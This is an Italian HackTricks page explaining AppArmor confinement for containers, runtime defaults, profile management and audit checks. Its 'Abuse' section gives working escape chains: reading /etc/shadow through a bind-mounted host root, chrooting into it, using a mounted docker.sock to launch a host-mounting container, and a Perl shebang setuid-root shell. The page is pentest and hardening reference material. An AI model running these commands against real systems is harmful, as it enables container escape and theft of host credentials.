# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

AppArmor è un sistema di **Mandatory Access Control** che applica restrizioni tramite profili per programma. A differenza dei tradizionali controlli DAC, che dipendono fortemente dalla proprietà utente e di gruppo, AppArmor permette al kernel di far rispettare una policy associata direttamente al processo. Negli ambienti container, questo è importante perché un workload potrebbe avere privilegi tradizionali sufficienti per provare un'azione e comunque essere negato perché il suo profilo AppArmor non consente il path, mount, comportamento di rete o l'uso di capability rilevanti.

Il punto concettuale più importante è che AppArmor è **path-based**. Valuta l'accesso al filesystem attraverso regole basate sui path piuttosto che tramite label come fa SELinux. Questo lo rende accessibile e potente, ma significa anche che bind mounts e layout di path alternativi richiedono attenzione. Se lo stesso contenuto dell'host diventa raggiungibile sotto un path diverso, l'effetto della policy potrebbe non essere quello che l'operatore si aspettava.

## Ruolo nell'isolamento dei container

Le review di sicurezza dei container spesso si fermano a capabilities e seccomp, ma AppArmor resta importante anche dopo quei controlli. Immagina un container che ha più privilegi di quanto dovrebbe, o un workload che ha bisogno di una capability in più per motivi operativi. AppArmor può ancora limitare l'accesso ai file, il comportamento di mount, la rete e i pattern di esecuzione in modi che interrompono i percorsi di abuso più evidenti. Per questo disabilitare AppArmor "solo per far funzionare l'applicazione" può trasformare silenziosamente una configurazione semplicemente rischiosa in una che è attivamente sfruttabile.

## Lab

Per verificare se AppArmor è attivo sull'host, usa:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Per vedere sotto quale utente è in esecuzione il processo corrente del container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor legato al profilo scelto dal runtime. Nel caso unconfined, quel livello aggiuntivo di restrizione scompare.

Puoi anche ispezionare ciò che Docker pensa di aver applicato:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso a runtime

Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può inoltre integrarsi con AppArmor sui sistemi basati su AppArmor, sebbene nelle distribuzioni incentrate su SELinux sia spesso quest'altro sistema MAC a prevalere. Kubernetes può esporre la policy AppArmor a livello di workload sui nodi che effettivamente supportano AppArmor. LXC e gli ambienti di system-container della famiglia Ubuntu usano anch'essi AppArmor in modo esteso.

Il punto pratico è che AppArmor non è una "Docker feature". È una funzionalità del kernel dell'host che diversi runtime possono scegliere di applicare. Se l'host non la supporta o al runtime viene richiesto di eseguire unconfined, la presunta protezione in realtà non c'è.

Per Kubernetes nello specifico, l'API moderna è `securityContext.appArmorProfile`. Da Kubernetes `v1.30`, le vecchie annotazioni beta AppArmor sono deprecate. Sugli host che lo supportano, `RuntimeDefault` è il profilo predefinito, mentre `Localhost` punta a un profilo che deve essere già caricato sul nodo. Questo è importante durante la revisione perché un manifest può sembrare consapevole di AppArmor pur dipendendo interamente dal supporto lato nodo e da profili pre-caricati.

Un dettaglio operativo sottile ma utile è che impostare esplicitamente `appArmorProfile.type: RuntimeDefault` è più restrittivo che semplicemente omettere il campo. Se il campo è impostato esplicitamente e il nodo non supporta AppArmor, l'ammissione dovrebbe fallire. Se il campo è omesso, il workload potrebbe comunque essere eseguito su un nodo senza AppArmor e semplicemente non ricevere quel livello di confinamento aggiuntivo. Dal punto di vista di un attacker, questo è un buon motivo per controllare sia il manifest che lo stato reale del nodo.

Sugli host AppArmor che supportano Docker, il default più noto è `docker-default`. Quel profilo è generato dal template AppArmor di Moby ed è importante perché spiega perché alcune PoC basate su capability falliscono ancora in un container di default. In termini generali, `docker-default` permette il networking ordinario, nega scritture a gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e restringe ptrace in modo che non sia una primitiva generale per sondare l'host. Capire quella baseline aiuta a distinguere "il container ha `CAP_SYS_ADMIN`" da "il container può effettivamente usare quella capability contro le interfacce del kernel che mi interessano".

## Gestione dei profili

I profili AppArmor sono solitamente memorizzati sotto `/etc/apparmor.d/`. Una convenzione di denominazione comune è sostituire le slash nel percorso dell'eseguibile con dei punti. Per esempio, un profilo per `/usr/bin/man` è comunemente memorizzato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è rilevante sia durante la difesa sia durante la valutazione, perché una volta che si conosce il nome del profilo attivo, spesso si può individuare rapidamente il file corrispondente sull'host.

Comandi utili per la gestione lato host includono:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La ragione per cui questi comandi sono importanti in un riferimento su container-security è che spiegano come i profili vengono effettivamente costruiti, caricati, impostati in complain mode e modificati dopo cambiamenti dell'applicazione. Se un operatore ha l'abitudine di mettere i profili in complain mode durante il troubleshooting e dimentica di ripristinare l'enforcement, il container può apparire protetto nella documentazione mentre in realtà si comporta in modo molto più permissivo.

### Costruzione e aggiornamento dei profili

`aa-genprof` può osservare il comportamento dell'applicazione e aiutare a generare un profilo in modo interattivo:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` può generare un profilo di esempio che può poi essere caricato con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre i dinieghi presenti nei log e aiutare l'operatore a decidere se consentirli o negarli:
```bash
sudo aa-logprof
```
### Registri

I dinieghi di AppArmor sono spesso visibili tramite `auditd`, syslog, o strumenti come `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Questo è utile operativamente e offensivamente. I Defenders lo usano per raffinare i profili. Gli Attackers lo usano per capire quale percorso o operazione esatta viene negata e se AppArmor è il controllo che blocca un exploit chain.

### Identificare il file di profilo esatto

Quando un runtime mostra un nome di profilo AppArmor specifico per un container, spesso è utile ricondurre quel nome al file di profilo sul disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Questo è particolarmente utile durante la revisione lato host perché colma il divario tra "il container dice di essere in esecuzione sotto il profilo `lowpriv`" e "le regole effettive risiedono in questo file specifico che può essere revisionato o ricaricato".

### Regole più importanti da controllare

Quando puoi leggere un profilo, non fermarti alle semplici righe `deny`. Diversi tipi di regole cambiano sostanzialmente quanto AppArmor sia efficace contro un tentativo di container escape:

- `ux` / `Ux`: esegue il binario di destinazione senza confinamento. Se un helper, shell o interpreter raggiungibile è consentito sotto `ux`, quello è di solito la prima cosa da testare.
- `px` / `Px` e `cx` / `Cx`: eseguono transizioni di profilo su exec. Non sono automaticamente pericolose, ma vale la pena verificarle perché una transizione può portare in un profilo molto più permissivo dell'attuale.
- `change_profile`: permette a un task di passare a un altro profilo caricato, immediatamente o al prossimo exec. Se il profilo di destinazione è più debole, questo può diventare la via di fuga prevista da un dominio restrittivo.
- `flags=(complain)`, `flags=(unconfined)`, oppure il più recente `flags=(prompt)`: questi dovrebbero influenzare il livello di fiducia che riponi nel profilo. `complain` registra i `deny` invece di applicarli, `unconfined` rimuove il confine, e `prompt` dipende da un percorso decisionale in userspace piuttosto che da un `deny` imposto dal kernel.
- `userns` or `userns create,`: le policy AppArmor più recenti possono mediare la creazione di user namespaces. Se un profilo container lo permette esplicitamente, i nested user namespaces rimangono in gioco anche quando la piattaforma usa AppArmor come parte della sua strategia di hardening.

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Questo tipo di audit è spesso più utile che guardare centinaia di regole di file ordinarie. Se un breakout dipende dall'esecuzione di un helper, dall'entrare in un nuovo namespace o dall'evadere in un profilo meno restrittivo, la risposta è spesso nascosta in queste regole orientate alle transizioni piuttosto che nelle ovvie righe in stile `deny /etc/shadow r`.

## Misconfigurations

L'errore più ovvio è `apparmor=unconfined`. Gli amministratori lo impostano spesso durante il debug di un'applicazione che falliva perché il profilo bloccava correttamente qualcosa di pericoloso o inatteso. Se il flag rimane in produzione, l'intero livello MAC è di fatto rimosso.

Un altro problema sottile è presumere che i bind mounts siano innocui perché i permessi dei file sembrano normali. Poiché AppArmor si basa sui path, esporre path dell'host sotto punti di mount alternativi può interagire male con le regole sui path. Un terzo errore è dimenticare che un nome di profilo in un file di configurazione significa poco se il kernel host non sta effettivamente applicando AppArmor.

## Abuse

Quando AppArmor non c'è più, operazioni che prima erano limitate possono improvvisamente funzionare: leggere path sensibili tramite bind mounts, accedere a parti di procfs o sysfs che avrebbero dovuto rimanere più difficili da usare, eseguire azioni correlate ai mount se anche capabilities/seccomp lo permettono, o usare path che un profilo normalmente negherebbe. AppArmor è spesso il meccanismo che spiega perché un tentativo di breakout basato sulle capabilities "should work" sulla carta ma fallisce ancora nella pratica. Rimuovi AppArmor, e lo stesso tentativo può cominciare a riuscire.

Se sospetti che AppArmor sia la causa principale che ferma una catena di abuso basata su path-traversal, bind-mount, o mount-based, il primo passo è di solito confrontare ciò che diventa accessibile con e senza un profilo. Per esempio, se un path dell'host è montato all'interno del container, inizia controllando se puoi traversarlo e leggerlo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se il container ha anche una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici è verificare se AppArmor è il controllo che blocca le operazioni di mount o l'accesso a kernel filesystems:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Negli ambienti in cui un percorso host è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare un problema di divulgazione di informazioni in sola lettura in un accesso diretto ai file dell'host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Il punto di questi comandi non è che AppArmor da solo crei il breakout. È che una volta rimosso AppArmor, molte vie di abuso basate su filesystem e mount diventano immediatamente testabili.

### Esempio completo: AppArmor disabilitato + root dell'host montata

Se il container ha già la root dell'host bind-mounted su `/host`, rimuovere AppArmor può trasformare un percorso di abuso su filesystem bloccato in una completa host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una volta che la shell viene eseguita attraverso il filesystem dell'host, il carico di lavoro è effettivamente uscito dal confine del container:
```bash
id
hostname
cat /etc/shadow | head
```
### Esempio completo: AppArmor Disabled + Runtime Socket

Se la vera barriera era AppArmor intorno allo stato runtime, un socket montato può essere sufficiente per un escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Il percorso esatto dipende dal mount point, ma il risultato finale è lo stesso: AppArmor non impedisce più l'accesso alla runtime API, e la runtime API può avviare un container in grado di compromettere l'host.

### Esempio completo: Path-Based Bind-Mount Bypass

Poiché AppArmor è basato sui percorsi, proteggere `/proc/**` non protegge automaticamente lo stesso contenuto del procfs dell'host quando è raggiungibile tramite un percorso diverso:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impatto dipende da cosa è esattamente montato e se il percorso alternativo costituisce anche un bypass per altri controlli, ma questo schema è una delle ragioni più chiare per cui AppArmor deve essere valutato insieme al layout dei mount piuttosto che in isolamento.

### Esempio completo: Shebang Bypass

La policy di AppArmor a volte prende di mira il percorso di un interprete in modo da non tener completamente conto dell'esecuzione di script tramite la gestione dello shebang. Un esempio storico prevedeva l'uso di uno script la cui prima riga punta a un interprete confinato:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Questo tipo di esempio è importante come promemoria che l'intento del profilo e la semantica effettiva di esecuzione possono divergere. Quando si esamina AppArmor in ambienti container, le catene di interpreter e i percorsi alternativi di esecuzione meritano particolare attenzione.

## Controlli

L'obiettivo di questi controlli è rispondere rapidamente a tre domande: AppArmor è abilitato sull'host, il processo corrente è confinato e il runtime ha effettivamente applicato un profilo a questo container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, il workload non beneficia del confinamento di AppArmor.
- If `aa-status` shows AppArmor disabled or not loaded, qualsiasi nome di profilo nella configurazione runtime è per lo più cosmetico.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, spesso è la ragione per cui un percorso di abuso basato su filesystem o mount funziona.
- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, la configurazione del runtime o dell'orchestrator non è sufficiente di per sé.
- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, il confine pratico può essere molto più debole di quanto suggerisca il nome del profilo.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor è supportato tramite `--security-opt`, ma il default esatto dipende dall'host/runtime ed è meno universale rispetto al profilo `docker-default` documentato da Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profilo debole, nodi senza supporto AppArmor |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | I runtime comunemente supportati da Kubernetes supportano AppArmor, ma l'effettiva applicazione dipende ancora dal supporto del nodo e dalle impostazioni del workload | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Per AppArmor, la variabile più importante è spesso l'**host**, non solo il runtime. Una impostazione del profilo in un manifest non crea confinamento su un nodo dove AppArmor non è abilitato.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
